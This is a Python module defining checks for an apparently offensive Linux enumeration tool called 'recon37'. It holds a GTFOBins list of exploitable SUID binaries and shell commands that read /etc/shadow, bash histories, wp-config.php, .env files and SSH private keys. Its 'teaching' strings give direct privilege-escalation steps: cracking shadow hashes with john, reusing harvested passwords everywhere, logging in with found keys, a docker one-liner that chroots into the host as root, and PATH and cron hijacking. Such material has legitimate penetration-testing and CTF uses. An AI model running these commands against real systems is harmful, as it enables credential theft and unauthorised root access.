"""Enumeration check definitions for recon37."""
from __future__ import annotations

# GTFOBins SUID binaries that can be exploited for privesc
GTFOBINS_SUID = {
    "aria2c", "ash", "awk", "base32", "base64", "bash", "busybox", "cat",
    "chmod", "chown", "cp", "csh", "curl", "cut", "dash", "date", "dd",
    "dialog", "diff", "dmsetup", "docker", "ed", "emacs", "env", "expand",
    "expect", "file", "find", "flock", "fmt", "fold", "gawk", "gdb",
    "gimp", "grep", "head", "hexdump", "highlight", "hping3", "iconv",
    "install", "ionice", "ip", "jjs", "join", "jq", "ksh", "ld.so", "less",
    "logsave", "look", "lua", "make", "mawk", "more", "mv", "mysql",
    "nano", "nawk", "nc", "nice", "nl", "nmap", "node", "nohup", "od",
    "openssl", "perl", "pg", "php", "pic", "pico", "python", "python2",
    "python3", "readelf", "rlwrap", "rpm", "rpmquery", "rsync", "run-parts",
    "rvim", "scp", "sed", "setarch", "shuf", "socat", "sort", "sqlite3",
    "ss", "ssh-keygen", "start-stop-daemon", "stdbuf", "strace", "strings",
    "tail", "tar", "taskset", "tclsh", "tee", "tftp", "time", "timeout",
    "ul", "unexpand", "uniq", "unshare", "vim", "watch", "wget", "wish",
    "xargs", "xxd", "zip", "zsh",
}

# Commands grouped by check category
ENUM_CHECKS: dict[str, list[dict]] = {
    "system": [
        {"name": "hostname", "cmd": "hostname 2>/dev/null", "description": "System hostname"},
        {"name": "os_release", "cmd": "cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null", "description": "OS version"},
        {"name": "kernel", "cmd": "uname -a 2>/dev/null", "description": "Kernel version"},
        {"name": "arch", "cmd": "uname -m 2>/dev/null", "description": "Architecture"},
        {"name": "uptime", "cmd": "uptime 2>/dev/null", "description": "System uptime"},
    ],
    "users": [
        {"name": "current_user", "cmd": "id 2>/dev/null", "description": "Current user and groups"},
        {"name": "whoami", "cmd": "whoami 2>/dev/null", "description": "Current username"},
        {"name": "sudo_perms", "cmd": "sudo -l 2>/dev/null", "description": "Sudo permissions"},
        {"name": "users_with_shell", "cmd": "grep -v '/nologin\\|/false' /etc/passwd 2>/dev/null", "description": "Users with login shells"},
        {"name": "logged_in", "cmd": "w 2>/dev/null || who 2>/dev/null", "description": "Currently logged in users"},
        {"name": "last_logins", "cmd": "last -n 10 2>/dev/null", "description": "Recent logins"},
        {"name": "home_dirs", "cmd": "ls -la /home/ 2>/dev/null", "description": "Home directories"},
    ],
    "suid": [
        {"name": "suid_binaries", "cmd": "find / -perm -4000 -type f 2>/dev/null", "description": "SUID binaries"},
        {"name": "sgid_binaries", "cmd": "find / -perm -2000 -type f 2>/dev/null", "description": "SGID binaries"},
    ],
    "creds": [
        {"name": "bash_history", "cmd": "cat ~/.bash_history 2>/dev/null; cat /home/*/.bash_history 2>/dev/null", "description": "Bash history (may contain passwords)"},
        {"name": "wp_config", "cmd": "find / -name wp-config.php -exec cat {} \\; 2>/dev/null", "description": "WordPress config (DB credentials)"},
        {"name": "env_files", "cmd": "find / -name .env -exec cat {} \\; 2>/dev/null | head -100", "description": ".env files"},
        {"name": "ssh_keys", "cmd": "find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null | head -20", "description": "SSH keys"},
        {"name": "shadow_readable", "cmd": "cat /etc/shadow 2>/dev/null | head -20", "description": "/etc/shadow (if readable)"},
        {"name": "config_files", "cmd": "find /opt /var/backups /tmp /var/www -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.bak' -o -name '*.old' 2>/dev/null | head -30", "description": "Config and backup files"},
        {"name": "db_configs", "cmd": "find / -name 'database.yml' -o -name 'db.php' -o -name 'settings.py' -o -name 'config.php' 2>/dev/null | head -20", "description": "Database config files"},
        {"name": "backup_files", "cmd": "ls -la /var/backups/ 2>/dev/null; ls -la /opt/ 2>/dev/null; ls -la /tmp/ 2>/dev/null", "description": "Backup and temp directories"},
        {"name": "credential_files", "cmd": "find /opt /var /tmp /home -readable -name '*.txt' -o -name '*.log' -o -name '*.bak' 2>/dev/null | xargs grep -li -E 'pass(word)?|cred|secret|key|token' 2>/dev/null | head -20", "description": "Files containing credential keywords"},
    ],
    "network": [
        {"name": "interfaces", "cmd": "ip addr 2>/dev/null || ifconfig 2>/dev/null", "description": "Network interfaces"},
        {"name": "routes", "cmd": "ip route 2>/dev/null || route -n 2>/dev/null", "description": "Routing table"},
        {"name": "listening_ports", "cmd": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", "description": "Listening ports"},
        {"name": "connections", "cmd": "ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null", "description": "Active connections"},
        {"name": "hosts", "cmd": "cat /etc/hosts 2>/dev/null", "description": "/etc/hosts"},
        {"name": "resolv", "cmd": "cat /etc/resolv.conf 2>/dev/null", "description": "DNS config"},
        {"name": "arp", "cmd": "arp -a 2>/dev/null || ip neigh 2>/dev/null", "description": "ARP table"},
    ],
    "cron": [
        {"name": "crontab", "cmd": "crontab -l 2>/dev/null", "description": "Current user crontab"},
        {"name": "system_cron", "cmd": "ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null", "description": "System cron jobs"},
        {"name": "cron_dirs", "cmd": "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null", "description": "Cron directories"},
        {"name": "writable_cron", "cmd": "find /etc/cron* -writable 2>/dev/null", "description": "Writable cron files"},
    ],
    "docker": [
        {"name": "docker_socket", "cmd": "ls -la /var/run/docker.sock 2>/dev/null", "description": "Docker socket"},
        {"name": "docker_group", "cmd": "grep docker /etc/group 2>/dev/null", "description": "Docker group members"},
        {"name": "containers", "cmd": "docker ps -a 2>/dev/null", "description": "Running containers"},
        {"name": "in_container", "cmd": "cat /proc/1/cgroup 2>/dev/null | grep -i docker; ls -la /.dockerenv 2>/dev/null", "description": "Are we in a container?"},
        {"name": "lxc_check", "cmd": "cat /proc/1/cgroup 2>/dev/null | grep -i lxc", "description": "LXC container check"},
    ],
    "writable": [
        {"name": "writable_dirs", "cmd": "find / -writable -type d 2>/dev/null | grep -v proc | head -30", "description": "World-writable directories"},
        {"name": "writable_files", "cmd": "find /etc /usr /opt -writable -type f 2>/dev/null | head -30", "description": "Writable system files"},
        {"name": "path_writable", "cmd": "echo $PATH | tr ':' '\\n' | while read p; do [ -w \"$p\" ] && echo \"WRITABLE: $p\"; done 2>/dev/null", "description": "Writable PATH directories"},
    ],
}

# Teaching explanations for findings
TEACHING = {
    "suid": "SUID binaries run with the file owner's permissions (often root). If a SUID binary is on the GTFOBins list, you can likely escalate to root. Check https://gtfobins.github.io/#+suid for exploitation steps.",
    "sudo": "sudo -l shows what commands this user can run as root. 'NOPASSWD' means no password needed. Even restricted sudo entries can often be abused — check GTFOBins for the specific binary.",
    "shadow": "/etc/shadow is readable! This file contains password hashes. Copy them and crack with 'john --wordlist=rockyou.txt shadow.txt' or hashcat.",
    "wp_config": "WordPress wp-config.php contains database credentials. These passwords are often reused for SSH or other services. Try them everywhere.",
    "ssh_keys": "Found SSH private keys. Try them to log in as that user: 'ssh -i id_rsa user@target'. No password needed if the key isn't passphrase-protected.",
    "docker_socket": "Docker socket is accessible! You can mount the host filesystem: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh' — instant root on the host.",
    "writable_path": "A directory in PATH is writable. You can place a malicious script there that gets executed instead of the real binary (PATH hijacking).",
    "cron_writable": "Writable cron files mean you can inject commands that run as the cron job's user (often root).",
    "container": "We're inside a container. Look for container escapes: mounted docker socket, privileged mode, kernel exploits.",
    "env_files": ".env files often contain API keys, database passwords, and secrets. Check for password reuse.",
    "credential_files": "Files containing password-related keywords found. Read them for hardcoded credentials.",
}

ALL_CHECKS = list(ENUM_CHECKS.keys())
